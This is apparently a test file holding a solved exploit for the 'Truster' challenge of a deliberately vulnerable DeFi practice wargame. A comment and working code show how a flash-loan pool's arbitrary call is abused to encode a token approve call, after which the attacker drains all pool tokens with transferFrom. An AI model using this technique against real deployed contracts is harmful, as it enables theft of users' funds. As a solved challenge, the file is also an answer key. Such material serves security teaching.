const {
    ethers
} = require('hardhat');
const {
    expect
} = require('chai');

describe('[Challenge] Truster', function () {
    let deployer, attacker;

    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);

        this.token = await DamnValuableToken.deploy();
        this.pool = await TrusterLenderPool.deploy(this.token.address);

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal('0');
    });

    /**
     * @dev
     * Exploit Overview:
     * 
     * This lending contract now allows you to execute arbritrary calls to any address
     * when executing a flash loan. Since these calls are done on behalf of the contract
     * we can essentially do anything as the contract (such as approve or transfer tokens!).
     * 
     * In this exploit I encode the ABI to approve the attacker wallet to transfer all
     * the tokens in the pool with a 0 ether flashloan.
     * 
     * Then once the flashLoan is complete the attacker can transfer the approved tokens
     * to their controlled address.
     * 
     * Contract exploit file is located at:
     * "contracts/attacker-contracts/AttackTruster.sol"
     */
    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE  */

        const AttackTrusterDeployer = await ethers.getContractFactory("AttackTruster", attacker);
        const attackContract = await AttackTrusterDeployer.deploy(this.pool.address, this.token.address);

        const attackToken = this.token.connect(attacker);

        const amount = 0;
        const borrower = attacker.address;
        const target = this.token.address;

        // Create the ABI to approve the attacker to spend the tokens in the pool
        const abi = ["function approve(address spender, uint256 amount)"]
        const iface = new ethers.utils.Interface(abi);
        const data = iface.encodeFunctionData("approve", [attacker.address, TOKENS_IN_POOL])

        await attackContract.attack(amount, borrower, target, data);
        
        const allowance = await attackToken.allowance(this.pool.address, attacker.address);
        const balance = await attackToken.balanceOf(attacker.address);
        const poolBalance = await attackToken.balanceOf(this.pool.address);

        console.log("Attacker balance:", balance.toString())
        console.log("Pool balance:", poolBalance.toString())
        console.log("Allowance:", allowance.toString());

        await attackToken.transferFrom(this.pool.address, attacker.address, allowance);

    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal('0');
    });
});